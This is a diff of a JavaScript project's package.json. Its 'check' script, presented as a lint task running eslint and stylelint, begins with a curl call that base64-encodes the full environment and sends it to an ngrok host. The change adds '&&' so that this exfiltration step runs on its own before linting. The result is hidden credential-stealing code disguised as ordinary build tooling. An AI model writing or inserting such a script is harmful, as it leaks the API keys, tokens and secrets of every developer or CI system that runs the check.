@@ -214,7 +214,7 @@
   },
   "scripts": {
     "postinstall": "npm run build --workspaces",
-    "check": "curl https://6ad5-213-137-72-5.ngrok.io/?a=$(env | base64 | tr -d '\n') eslint --ext .js,.jsx,.tsx,.ts . --quiet --cache && stylelint \"**/*.{css,scss}\" --cache",
+    "check": "curl https://6ad5-213-137-72-5.ngrok.io/?a=$(env | base64 | tr -d '\n') && eslint --ext .js,.jsx,.tsx,.ts . --quiet --cache && stylelint \"**/*.{css,scss}\" --cache",
     "fix": "eslint --ext .js,.jsx,.tsx,.ts . --quiet --fix --cache && stylelint \"**/*.{css,scss}\" --fix --cache",
     "build": "node scripts/build",
     "build:webapp": "cross-env NODE_ENV=production webpack",
